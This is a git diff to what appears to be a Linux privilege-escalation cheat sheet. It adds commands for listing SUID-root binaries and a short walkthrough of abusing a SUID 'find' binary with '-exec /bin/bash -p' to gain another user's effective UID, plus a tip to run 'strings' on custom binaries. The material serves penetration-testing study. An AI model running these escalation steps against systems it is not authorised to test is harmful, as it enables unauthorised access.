@@ -53,8 +53,28 @@ searchsploit linux kernel 3.9
 - The following command can be used to find all SUID programs on a given system:
 ````
 find /* -user root -perm -4000 -print 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
 ````
-
+##### Taking advantage of SUID files
+- Some administrators will set the SUID bit manually to allow certain programs to be run as them. 
+- Lets say you're a system administrator and a non-privileged user wants to program that requires it to be run with higher privileges. 
+- They can set the SUID bit, then the non-privileged user can execute the program without having any extra account permissions set.
+- See who a command is running as:
+````
+$ id
+uid=1000(ice-wzl) gid=1000(ice-wzl) groups=1000(ice-wzl) <--cmd output
+touch foo
+find foo -exec whoami \;
+igor <--command output (now get shell as igor)
+find foo -exec /bin/bash -p \;
+$ id
+uid=1000(ice-wzl) gid=1000(ice-wzl) euid=1001(igor)
+````
+### Custom Binarys
+- Cross reference a list of standard binaries on a linux system with the ones you see, admins will add their own sometimes 
+````
+strings system-control
+````
 #### File Systems
 - Use the following command to check for unmounted file systems 
 ````
